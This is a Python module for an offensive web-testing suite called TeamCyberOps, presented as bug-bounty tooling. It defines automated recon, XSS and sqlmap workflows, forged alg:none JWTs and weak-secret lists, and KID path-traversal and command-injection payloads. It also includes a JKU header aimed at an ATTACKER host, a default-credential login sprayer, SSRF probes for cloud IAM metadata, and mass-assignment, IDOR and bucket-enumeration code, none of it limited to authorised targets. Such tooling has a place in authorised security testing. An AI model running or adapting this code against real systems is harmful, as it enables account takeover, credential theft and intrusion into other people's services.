"""
TeamCyberOps Suite — Automation Workflows, Live Monitor, Auth Testing, Cloud Security
"""
import json, re, threading, time, hashlib, os, shutil, urllib.request, urllib.parse, subprocess
from pathlib import Path
from datetime import datetime, timedelta

BASE_DIR  = Path(__file__).parent.parent.parent
LOGS_DIR  = BASE_DIR / "logs"
CACHE_DIR = BASE_DIR / "cache"
for d in [LOGS_DIR, CACHE_DIR]:
    d.mkdir(exist_ok=True)


# ══════════════════════════════════════════════════════════════
#  AUTOMATION WORKFLOWS
# ══════════════════════════════════════════════════════════════

BUILTIN_WORKFLOWS = {
    "🌐 Full Recon": {
        "description": "Complete recon pipeline",
        "steps": [
            {"name": "Subfinder",    "cmd": ["subfinder","-d","{target}","-silent"],          "output": "subdomains.txt"},
            {"name": "DNSx",         "cmd": ["dnsx","-l","subdomains.txt","-silent"],           "output": "resolved.txt"},
            {"name": "HTTPx",        "cmd": ["httpx","-l","resolved.txt","-silent","-status-code","-title"], "output": "alive.txt"},
            {"name": "Katana",       "cmd": ["katana","-l","alive.txt","-silent","-d","3"],     "output": "urls.txt"},
            {"name": "Nuclei",       "cmd": ["nuclei","-l","alive.txt","-silent","-no-color","-severity","medium,high,critical"], "output": "vulns.txt"},
        ]
    },
    "🎯 XSS Hunter": {
        "description": "Full XSS discovery and testing",
        "steps": [
            {"name": "GAU",          "cmd": ["gau","--threads","5","{target}"],                "output": "gau_urls.txt"},
            {"name": "GF XSS",       "cmd": ["bash","-c","cat gau_urls.txt | gf xss 2>/dev/null"], "output": "xss_candidates.txt"},
            {"name": "kxss",         "cmd": ["bash","-c","cat xss_candidates.txt | kxss 2>/dev/null"], "output": "xss_reflected.txt"},
            {"name": "Dalfox",       "cmd": ["dalfox","file","xss_candidates.txt","--silence","--no-color"], "output": "dalfox_results.txt"},
        ]
    },
    "💉 SQLi Hunter": {
        "description": "SQL Injection discovery",
        "steps": [
            {"name": "GAU",          "cmd": ["gau","--threads","5","{target}"],                "output": "gau_urls.txt"},
            {"name": "GF SQLi",      "cmd": ["bash","-c","cat gau_urls.txt | gf sqli 2>/dev/null"], "output": "sqli_candidates.txt"},
            {"name": "SQLMap",       "cmd": ["bash","-c","head -5 sqli_candidates.txt | while read url; do sqlmap -u \"$url\" --batch --level=1 --risk=1 --timeout=10 2>/dev/null | tail -20; done"], "output": "sqlmap_results.txt"},
        ]
    },
    "⚠️ Takeover Scanner": {
        "description": "Subdomain takeover detection",
        "steps": [
            {"name": "Subfinder",    "cmd": ["subfinder","-d","{target}","-silent"],           "output": "subdomains.txt"},
            {"name": "Subzy",        "cmd": ["subzy","run","--targets","subdomains.txt","--hide-fails"], "output": "takeover_results.txt"},
        ]
    },
    "📂 Directory Fuzzing": {
        "description": "Directory and file discovery",
        "steps": [
            {"name": "FFUF Dirs",    "cmd": ["ffuf","-u","https://{target}/FUZZ","-w","/usr/share/wordlists/dirb/common.txt","-mc","200,201,204,301,302,307,401,403","-silent","-t","50"], "output": "ffuf_results.txt"},
        ]
    },
    "🔑 Secret Scanner": {
        "description": "Find exposed secrets in JS files",
        "steps": [
            {"name": "GAU JS",       "cmd": ["bash","-c","gau {target} 2>/dev/null | grep '\\.js$'"], "output": "js_files.txt"},
            {"name": "Trufflehog",   "cmd": ["bash","-c","cat js_files.txt | while read url; do curl -sk \"$url\" | trufflehog --only-verified stdin 2>/dev/null; done"], "output": "secrets.txt"},
        ]
    },
    "☁️ Cloud Assets": {
        "description": "AWS/GCP/Azure asset discovery",
        "steps": [
            {"name": "S3 Enum",      "cmd": ["bash","-c","for b in {target} {target}-backup {target}-dev {target}-data; do aws s3 ls s3://$b 2>&1 | grep -v NoSuchBucket && echo \"FOUND: $b\"; done"], "output": "s3_results.txt"},
            {"name": "Azure Blobs",  "cmd": ["bash","-c","for b in {target} {target}-backup {target}-dev; do curl -sk https://$b.blob.core.windows.net/ | grep -q 'BlobServiceProperties' && echo \"FOUND: $b.blob.core.windows.net\"; done"], "output": "azure_results.txt"},
        ]
    },
    "🔐 Auth Testing": {
        "description": "Authentication vulnerability testing",
        "steps": [
            {"name": "JWT Scan",     "cmd": ["bash","-c","curl -sk https://{target}/ -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.' -o /dev/null -w '%{http_code}'"], "output": "jwt_none.txt"},
        ]
    },
}

WORKFLOW_SAVE_DIR = BASE_DIR / "workflows"
WORKFLOW_SAVE_DIR.mkdir(exist_ok=True)


def list_workflows() -> dict:
    """Return all workflows (builtin + custom)."""
    result = dict(BUILTIN_WORKFLOWS)
    for f in WORKFLOW_SAVE_DIR.glob("*.json"):
        try:
            wf = json.loads(f.read_text())
            result[wf.get("name", f.stem)] = wf
        except Exception:
            pass
    return result


def run_workflow(name: str, target: str, output_dir: Path,
                 log_cb=None, done_cb=None) -> threading.Thread:
    """Run a workflow against a target."""
    wf     = list_workflows().get(name, {})
    steps  = wf.get("steps", [])
    log    = log_cb or print
    out    = output_dir
    out.mkdir(parents=True, exist_ok=True)

    def _run():
        log(f"[*] Starting workflow: {name}", "info")
        log(f"[*] Target: {target}", "info")
        log(f"[*] Steps: {len(steps)}", "info")
        log("=" * 50, "dim")

        for i, step in enumerate(steps, 1):
            step_name = step.get("name", f"Step {i}")
            cmd = [c.replace("{target}", target) for c in step.get("cmd", [])]
            out_file = str(out / step.get("output", f"step{i}.txt"))

            log(f"\n[{i}/{len(steps)}] {step_name}", "header")
            log(f"  $ {' '.join(cmd)}", "cmd")

            tool = cmd[0]
            if not shutil.which(tool) and tool != "bash":
                log(f"  [!] {tool} not installed — skipping", "warn")
                continue

            try:
                with open(out_file, 'w') as outf:
                    proc = subprocess.run(
                        cmd, stdout=outf, stderr=subprocess.PIPE,
                        text=True, timeout=300, cwd=str(out)
                    )
                lines = Path(out_file).read_text().strip().splitlines()
                log(f"  [+] Done: {len(lines)} lines → {step.get('output')}", "ok")
            except subprocess.TimeoutExpired:
                log(f"  [!] {step_name} timed out", "warn")
            except Exception as e:
                log(f"  [!] Error: {e}", "warn")

        log(f"\n[✓] Workflow '{name}' complete", "ok")
        if done_cb:
            done_cb(name, target)

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    return t


def save_custom_workflow(name: str, steps: list, description: str = "") -> str:
    wf = {"name": name, "description": description, "steps": steps,
          "created": datetime.now().isoformat()}
    path = WORKFLOW_SAVE_DIR / f"{name.replace(' ','_')}.json"
    path.write_text(json.dumps(wf, indent=2))
    return str(path)


# ══════════════════════════════════════════════════════════════
#  LIVE TARGET MONITOR
# ══════════════════════════════════════════════════════════════

MONITOR_DIR  = BASE_DIR / "monitor"
MONITOR_DIR.mkdir(exist_ok=True)
MONITOR_FILE = MONITOR_DIR / "monitors.json"


def load_monitors() -> list:
    if MONITOR_FILE.exists():
        return json.loads(MONITOR_FILE.read_text())
    return []


def save_monitors(monitors: list):
    MONITOR_FILE.write_text(json.dumps(monitors, indent=2))


def add_monitor(target: str, interval_hours: int = 24,
                checks: list = None) -> dict:
    """Add a target to continuous monitoring."""
    checks = checks or ["subdomains", "http_status", "tech_stack", "js_files"]
    monitor = {
        "id":        hashlib.md5(target.encode()).hexdigest()[:8],
        "target":    target,
        "interval":  interval_hours,
        "checks":    checks,
        "enabled":   True,
        "created":   datetime.now().isoformat(),
        "last_scan": None,
        "baseline":  {},
        "changes":   [],
    }
    monitors = load_monitors()
    # Update if exists
    monitors = [m for m in monitors if m["target"] != target]
    monitors.append(monitor)
    save_monitors(monitors)
    return monitor


def remove_monitor(target: str):
    monitors = [m for m in load_monitors() if m["target"] != target]
    save_monitors(monitors)


def get_baseline(target: str) -> dict:
    """Get baseline data for a target."""
    baseline = {}

    # Subdomain count
    try:
        url  = f"https://crt.sh/?q=%25.{urllib.parse.quote(target)}&output=json"
        req  = urllib.request.Request(url, headers={"User-Agent":"TeamCyberOps/1.0"})
        with urllib.request.urlopen(req, timeout=15) as r:
            data = json.loads(r.read())
        subs = set()
        for entry in data:
            for n in entry.get("name_value","").split("\n"):
                n = n.strip().lstrip("*.")
                if target in n:
                    subs.add(n)
        baseline["subdomains"] = sorted(list(subs))
        baseline["subdomain_count"] = len(subs)
    except Exception:
        baseline["subdomains"] = []

    # HTTP status + headers
    for scheme in ["https://", "http://"]:
        try:
            req = urllib.request.Request(
                f"{scheme}{target}", headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as r:
                baseline["http_status"]   = r.status
                baseline["server"]        = r.headers.get("Server","")
                baseline["x_powered_by"]  = r.headers.get("X-Powered-By","")
                baseline["content_hash"]  = hashlib.md5(r.read()[:10000]).hexdigest()
            break
        except Exception:
            pass

    baseline["timestamp"] = datetime.now().isoformat()
    return baseline


def check_for_changes(target: str, baseline: dict) -> list:
    """Compare current state to baseline and return changes."""
    changes = []
    current = get_baseline(target)

    # New subdomains
    old_subs = set(baseline.get("subdomains", []))
    new_subs = set(current.get("subdomains", []))
    added    = new_subs - old_subs
    removed  = old_subs - new_subs
    for sub in added:
        changes.append({"type": "new_subdomain",   "severity": "HIGH",
                        "detail": f"New subdomain: {sub}",  "target": sub})
    for sub in removed:
        changes.append({"type": "removed_subdomain","severity": "INFO",
                        "detail": f"Removed subdomain: {sub}", "target": sub})

    # HTTP status change
    if baseline.get("http_status") != current.get("http_status"):
        changes.append({"type": "status_change", "severity": "MEDIUM",
                        "detail": f"HTTP status: {baseline.get('http_status')} → {current.get('http_status')}"})

    # Technology change
    if baseline.get("server","") != current.get("server",""):
        changes.append({"type": "tech_change", "severity": "MEDIUM",
                        "detail": f"Server header changed: {baseline.get('server','')} → {current.get('server','')}"})

    # Content change
    if (baseline.get("content_hash") and current.get("content_hash") and
            baseline["content_hash"] != current["content_hash"]):
        changes.append({"type": "content_change", "severity": "INFO",
                        "detail": "Homepage content changed"})

    return changes


def run_monitor_check(target: str, log_cb=None) -> list:
    """Run a single monitor check and return changes found."""
    log = log_cb or print
    log(f"[*] Checking: {target}", "info")

    monitors = load_monitors()
    monitor  = next((m for m in monitors if m["target"] == target), None)

    if not monitor:
        monitor = add_monitor(target)

    baseline = monitor.get("baseline") or {}
    if not baseline:
        log(f"[*] Taking baseline for {target}...", "info")
        baseline = get_baseline(target)
        monitor["baseline"] = baseline
        log(f"[+] Baseline: {baseline.get('subdomain_count',0)} subdomains", "ok")
    else:
        log(f"[*] Comparing to baseline...", "info")
        changes = check_for_changes(target, baseline)
        monitor["last_scan"] = datetime.now().isoformat()

        if changes:
            monitor["changes"].extend([{**c, "found_at": datetime.now().isoformat()} for c in changes])
            log(f"[!!!] {len(changes)} changes detected!", "vuln")
            for c in changes:
                log(f"  [{c['severity']}] {c['detail']}", "warn" if c['severity'] == "HIGH" else "info")
        else:
            log(f"[OK] No changes detected", "ok")

        # Update baseline if > 1 day old
        baseline_age = datetime.now() - datetime.fromisoformat(baseline.get("timestamp", datetime.now().isoformat()))
        if baseline_age.days >= 1:
            monitor["baseline"] = get_baseline(target)
            log(f"[*] Baseline refreshed", "dim")

    # Save
    monitors = [m for m in monitors if m["target"] != target]
    monitors.append(monitor)
    save_monitors(monitors)

    return monitor.get("changes", [])


# ══════════════════════════════════════════════════════════════
#  AUTHENTICATION TESTING SUITE
# ══════════════════════════════════════════════════════════════

JWT_ATTACKS = {
    "Algorithm None (alg:none)": {
        "description": "Remove signature by setting alg to none",
        "tokens": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
            "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
            "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.",
        ],
        "impact": "Authentication bypass — full admin access"
    },
    "Weak Secret Brute Force": {
        "description": "Common JWT secrets",
        "secrets": ["secret","password","123456","admin","key","jwt","secret123",
                    "mysecret","jwtkey","jwtsecret","SuperSecretKey","YourJWTSecretKey",
                    "defaultsecret","dev_secret","prod_secret","private_key",
                    "ChangeThisToALongRandomSecret","ThisIsAVeryLongSecretKeyThatIsUsedForJWT",
                    "your-secret","my-secret","super-secret","ultra-secret","mega-secret"],
        "impact": "Full token forgery"
    },
    "RS256 → HS256 Confusion": {
        "description": "Use RS256 public key as HS256 HMAC secret",
        "steps": [
            "1. Fetch public key: GET /jwks.json or /.well-known/jwks.json",
            "2. Extract RSA public key (n,e parameters)",
            "3. Create HS256 token signed with the public key",
            "4. Send forged token in Authorization header",
        ],
        "impact": "Authentication bypass using public key"
    },
    "KID Path Traversal": {
        "description": "Manipulate 'kid' header to point to attacker file",
        "payloads": [
            "../../dev/null",
            "../../../../dev/null",
            "/dev/null",
            "| sleep 5",
            "../../proc/sys/kernel/randomize_va_space",
        ],
        "impact": "RCE or signature bypass"
    },
    "JKU/X5U Injection": {
        "description": "Point key URL to attacker-controlled server",
        "header_template": {
            "alg": "RS256", "typ": "JWT",
            "jku": "https://ATTACKER/.well-known/jwks.json"
        },
        "impact": "Full token forgery with attacker's key"
    },
}

DEFAULT_CREDENTIALS = [
    ("admin",  "admin"),    ("admin",  "password"),  ("admin",  "123456"),
    ("admin",  "admin123"), ("root",   "root"),       ("root",   "toor"),
    ("admin",  ""),         ("",       "admin"),      ("test",   "test"),
    ("user",   "user"),     ("admin",  "1234"),       ("admin",  "12345"),
    ("admin",  "pass"),     ("guest",  "guest"),      ("demo",   "demo"),
    ("admin",  "changeme"), ("admin",  "letmein"),    ("admin",  "secret"),
    ("admin",  "qwerty"),   ("admin",  "abc123"),     ("sa",     ""),
    ("postgres","postgres"),("mysql",  "mysql"),      ("oracle", "oracle"),
    ("tomcat", "tomcat"),   ("tomcat", "s3cret"),     ("manager","manager"),
    ("jenkins","jenkins"),  ("gitlab", "gitlab"),     ("admin",  "gitlabpass"),
    ("pi",     "raspberry"),("ubuntu", "ubuntu"),     ("admin",  "admin@123"),
]

def test_default_creds(url: str, creds_list: list = None, log_cb=None) -> list:
    """Test default credentials against a login form."""
    log   = log_cb or print
    creds = creds_list or DEFAULT_CREDENTIALS[:20]
    found = []

    for user, pwd in creds:
        try:
            data = urllib.parse.urlencode({"username": user, "password": pwd,
                                            "user": user, "pass": pwd,
                                            "login": user}).encode()
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            req.add_header("User-Agent", "Mozilla/5.0")
            with urllib.request.urlopen(req, timeout=8) as r:
                body = r.read().decode("utf-8", errors="replace").lower()
                code = r.status
                # Check for success indicators
                success_signals = ["dashboard", "logout", "welcome", "profile",
                                   "account", "success", "home", "admin panel"]
                fail_signals    = ["invalid", "incorrect", "wrong", "failed",
                                   "error", "unauthorized", "login again"]
                is_success = (any(s in body for s in success_signals) and
                              not any(f in body for f in fail_signals))
                if is_success or code == 302:
                    found.append({"username": user, "password": pwd,
                                  "status": code, "signal": "redirect" if code == 302 else "content"})
                    log(f"  [!!!] VALID CREDS: {user}:{pwd} → HTTP {code}", "vuln")
        except Exception:
            pass

    return found


def analyze_session(url: str) -> dict:
    """Analyze session management security."""
    results = {"issues": [], "session_tokens": []}
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            headers = dict(r.headers)
            for k, v in headers.items():
                if k.lower() == "set-cookie":
                    results["session_tokens"].append(v)
                    # Check flags
                    vl = v.lower()
                    if "httponly" not in vl:
                        results["issues"].append({"severity": "MEDIUM", "issue": f"Cookie missing HttpOnly: {v[:60]}"})
                    if "secure" not in vl:
                        results["issues"].append({"severity": "LOW", "issue": f"Cookie missing Secure flag: {v[:60]}"})
                    if "samesite" not in vl:
                        results["issues"].append({"severity": "LOW", "issue": f"Cookie missing SameSite: {v[:60]}"})
                    # Check for predictable session token
                    cookie_val = v.split("=")[1].split(";")[0] if "=" in v else ""
                    if len(cookie_val) < 16:
                        results["issues"].append({"severity": "HIGH", "issue": f"Short session token (entropy risk): {cookie_val[:20]}"})
    except Exception as e:
        results["error"] = str(e)
    return results


# ══════════════════════════════════════════════════════════════
#  CLOUD SECURITY SCANNER
# ══════════════════════════════════════════════════════════════

AWS_CHECKS = {
    "S3 Buckets Public": {
        "description": "Find public S3 buckets for the target",
        "method": "bucket_enum",
    },
    "Cloud Metadata SSRF": {
        "description": "AWS/GCP/Azure metadata endpoint access",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "http://192.0.0.192/openstack/",
        ],
    },
    "AWS Keys in Environment": {
        "description": "Check for exposed AWS credentials",
        "endpoints": [
            "/.env", "/.env.local", "/.env.production",
            "/config/aws.php", "/aws.json", "/credentials",
            "/.aws/credentials",
        ],
    },
}

def check_cloud_metadata(url: str, log_cb=None) -> list:
    """Test if target is vulnerable to cloud metadata SSRF."""
    log     = log_cb or print
    results = []
    meta_endpoints = AWS_CHECKS["Cloud Metadata SSRF"]["payloads"]

    for endpoint in meta_endpoints:
        # Test as SSRF parameter values
        for param in ["url", "uri", "redirect", "next", "dest", "proxy", "endpoint", "api"]:
            test_url = f"{url}?{param}={urllib.parse.quote(endpoint)}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=6) as r:
                    body = r.read().decode("utf-8", errors="replace")
                    # Check for metadata response indicators
                    if any(k in body for k in ["ami-id","instance-id","iam","AccessKeyId",
                                                "ServiceAccount","computeMetadata"]):
                        result = {"type": "Cloud Metadata SSRF", "severity": "CRITICAL",
                                  "url": test_url, "endpoint": endpoint,
                                  "detail": f"Cloud metadata exposed via ?{param}="}
                        results.append(result)
                        log(f"  [!!!] SSRF to metadata: {test_url[:80]}", "vuln")
            except Exception:
                pass

    return results


def enumerate_buckets(domain: str, log_cb=None) -> list:
    """Enumerate cloud storage buckets for a domain."""
    log     = log_cb or print
    company = domain.split(".")[0]
    found   = []
    variants = [company, domain.replace(".","-"), company+"-backup", company+"-dev",
                company+"-staging", company+"-prod", company+"-data", company+"-assets",
                company+"-media", company+"-static", company+"-public", company+"-private",
                company+"-uploads", company+"-images", "backup-"+company, "dev-"+company]

    for variant in variants:
        # S3
        s3_url = f"https://{variant}.s3.amazonaws.com/"
        try:
            req = urllib.request.Request(s3_url, headers={"User-Agent":"Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read().decode("utf-8", errors="replace")[:2000]
                if "ListBucketResult" in body:
                    found.append({"type":"S3_PUBLIC","bucket":variant,"url":s3_url,"severity":"CRITICAL"})
                    log(f"  [!!!] PUBLIC S3: {s3_url}", "vuln")
                elif r.status in (200, 403):
                    found.append({"type":"S3_EXISTS","bucket":variant,"url":s3_url,"severity":"INFO"})
        except urllib.error.HTTPError as e:
            if e.code == 403:
                found.append({"type":"S3_EXISTS_PRIVATE","bucket":variant,"url":s3_url,"severity":"LOW"})
                log(f"  [+] S3 exists (private): {variant}", "info")
        except Exception:
            pass

    return found


# ══════════════════════════════════════════════════════════════
#  API SECURITY TESTER
# ══════════════════════════════════════════════════════════════

def test_idor(base_url: str, endpoint: str, id_param: str = "id",
              test_ids: list = None, headers: dict = None, log_cb=None) -> list:
    """Test for IDOR vulnerabilities."""
    log     = log_cb or print
    ids     = test_ids or [1,2,3,4,5,10,100,1000,"admin","test","self","me"]
    headers = headers or {"User-Agent": "Mozilla/5.0"}
    results = []
    baseline_body = ""

    for id_val in ids[:20]:
        try:
            url = f"{base_url}/{endpoint}/{id_val}"
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=8) as r:
                body = r.read().decode("utf-8", errors="replace")
                if r.status == 200 and body != baseline_body and len(body) > 50:
                    results.append({"id": id_val, "url": url,
                                    "status": r.status, "size": len(body),
                                    "sample": body[:100]})
                    if not baseline_body:
                        baseline_body = body
                    else:
                        log(f"  [+] Different response for id={id_val}: {len(body)} bytes", "info")
        except Exception:
            pass

    return results


def test_mass_assignment(url: str, method: str = "POST", headers: dict = None) -> dict:
    """Test for mass assignment vulnerabilities."""
    headers = headers or {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    test_payloads = [
        {"role": "admin"},
        {"isAdmin": True},
        {"admin": True},
        {"is_admin": 1},
        {"user_type": "admin"},
        {"privilege": "root"},
        {"verified": True},
        {"email_verified": True},
        {"balance": 99999},
        {"credits": 99999},
        {"__proto__": {"admin": True}},
        {"constructor": {"prototype": {"admin": True}}},
    ]
    results = []
    for payload in test_payloads:
        try:
            data = json.dumps(payload).encode()
            req  = urllib.request.Request(url, data=data, method=method, headers=headers)
            with urllib.request.urlopen(req, timeout=8) as r:
                body = r.read().decode("utf-8", errors="replace")
                if r.status in (200, 201, 204):
                    results.append({"payload": payload, "status": r.status,
                                    "response_size": len(body)})
        except Exception:
            pass
    return {"url": url, "method": method, "test_count": len(test_payloads),
            "potentially_vulnerable": len(results) > 0, "responses": results}


def fuzz_api_versions(base_url: str, endpoint: str = "/", log_cb=None) -> list:
    """Test API version enumeration."""
    log  = log_cb or print
    found = []
    versions = ["v1","v2","v3","v4","v5","v6","v10",
                "1.0","2.0","3.0","1","2","3",
                "api/v1","api/v2","api/v3","rest/v1","rest/v2",
                "graphql","graph","api","swagger","openapi"]
    for ver in versions:
        try:
            url = f"{base_url}/{ver}{endpoint}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read().decode("utf-8", errors="replace")[:500]
                found.append({"version": ver, "url": url, "status": r.status,
                               "size": len(body), "sample": body[:100]})
                log(f"  [+] API version found: {url} → {r.status}", "ok")
        except urllib.error.HTTPError as e:
            if e.code != 404:
                found.append({"version": ver, "url": url, "status": e.code})
        except Exception:
            pass
    return found


# ══════════════════════════════════════════════════════════════
#  BUSINESS LOGIC HUNTER
# ══════════════════════════════════════════════════════════════

BUSINESS_LOGIC_CHECKS = {
    "Price Manipulation": [
        "Test negative quantities: qty=-1",
        "Test zero price: price=0.00",
        "Test price in GET param: /pay?amount=1",
        "Test currency manipulation: currency=BTC vs USD",
        "Test discount codes: ADMIN, FREE, 100OFF",
        "Test integer overflow in price field",
        "Test floating point manipulation: 0.1+0.2 edge cases",
    ],
    "Race Conditions": [
        "Send parallel requests to redeem coupon/voucher",
        "Parallel account balance withdrawal",
        "Simultaneous vote/like actions",
        "Double transaction on payment endpoint",
        "Parallel password reset token generation",
        "Parallel account creation with same email",
    ],
    "Workflow Bypass": [
        "Skip payment step and go directly to /confirm",
        "Change order status via IDOR",
        "Access admin features by modifying role parameter",
        "Skip email verification step",
        "Access step 3 without completing step 1",
        "Reuse expired/completed tokens",
    ],
    "Privilege Escalation": [
        "Horizontal: Access another user's data via IDOR",
        "Vertical: Modify user role/permissions in request",
        "Admin APIs accessible to regular users",
        "Debug endpoints exposed in production",
        "Internal APIs accessible from internet",
    ],
    "Feature Abuse": [
        "Mass download via batch export",
        "Email bombing via contact form",
        "Account enumeration via error messages",
        "Automated account creation (no CAPTCHA)",
        "Password reset flooding",
        "Cache poisoning via Host header",
    ],
}

def get_business_logic_checklist(category: str = None) -> dict:
    """Get business logic testing checklist."""
    if category:
        return {category: BUSINESS_LOGIC_CHECKS.get(category, [])}
    return BUSINESS_LOGIC_CHECKS


# ══════════════════════════════════════════════════════════════
#  BUG BOUNTY PROGRAM MANAGER
# ══════════════════════════════════════════════════════════════

PROGRAMS_FILE = BASE_DIR / "db" / "programs.json"

def load_programs() -> list:
    if PROGRAMS_FILE.exists():
        return json.loads(PROGRAMS_FILE.read_text()).get("programs", [])
    return []

def save_program(program: dict) -> bool:
    data = {"programs": load_programs()}
    # Update if exists
    data["programs"] = [p for p in data["programs"] if p.get("name") != program.get("name")]
    program["updated"] = datetime.now().isoformat()
    data["programs"].append(program)
    PROGRAMS_FILE.write_text(json.dumps(data, indent=2))
    return True

def get_public_programs_list() -> list:
    """Return a curated list of popular bug bounty programs."""
    return [
        {"name": "HackerOne - General", "platform": "HackerOne", "url": "https://hackerone.com/directory",
         "bounty": "Variable", "scope": "Various"},
        {"name": "Bugcrowd Programs", "platform": "Bugcrowd", "url": "https://bugcrowd.com/programs",
         "bounty": "Variable", "scope": "Various"},
        {"name": "Intigriti", "platform": "Intigriti", "url": "https://app.intigriti.com/programs",
         "bounty": "Variable", "scope": "Various"},
        {"name": "Google VRP", "platform": "HackerOne", "url": "https://hackerone.com/google",
         "bounty": "$100-$31,337+", "scope": "*.google.com"},
        {"name": "Microsoft MSRC", "platform": "Self-hosted", "url": "https://msrc.microsoft.com",
         "bounty": "$500-$250,000", "scope": "Microsoft products"},
        {"name": "Apple Security", "platform": "Self-hosted", "url": "https://security.apple.com",
         "bounty": "$5,000-$1,000,000", "scope": "Apple products"},
        {"name": "Meta Bug Bounty", "platform": "Self-hosted", "url": "https://www.facebook.com/whitehat",
         "bounty": "$500+", "scope": "Facebook, Instagram, WhatsApp"},
        {"name": "Shopify", "platform": "HackerOne", "url": "https://hackerone.com/shopify",
         "bounty": "$500-$50,000", "scope": "shopify.com, myshopify.com"},
        {"name": "GitHub Security", "platform": "Self-hosted", "url": "https://bounty.github.com",
         "bounty": "$617-$30,000", "scope": "github.com"},
        {"name": "Cloudflare", "platform": "HackerOne", "url": "https://hackerone.com/cloudflare",
         "bounty": "$250-$3,000", "scope": "cloudflare.com"},
        {"name": "Twitter (X)", "platform": "HackerOne", "url": "https://hackerone.com/twitter",
         "bounty": "$140-$15,120", "scope": "twitter.com, x.com"},
        {"name": "PayPal", "platform": "HackerOne", "url": "https://hackerone.com/paypal",
         "bounty": "$100-$10,000", "scope": "paypal.com"},
        {"name": "Uber", "platform": "HackerOne", "url": "https://hackerone.com/uber",
         "bounty": "$500-$10,000", "scope": "*.uber.com"},
        {"name": "Airbnb", "platform": "HackerOne", "url": "https://hackerone.com/airbnb",
         "bounty": "$100-$10,000", "scope": "*.airbnb.com"},
        {"name": "Dropbox", "platform": "HackerOne", "url": "https://hackerone.com/dropbox",
         "bounty": "$216-$32,768", "scope": "dropbox.com"},
    ]
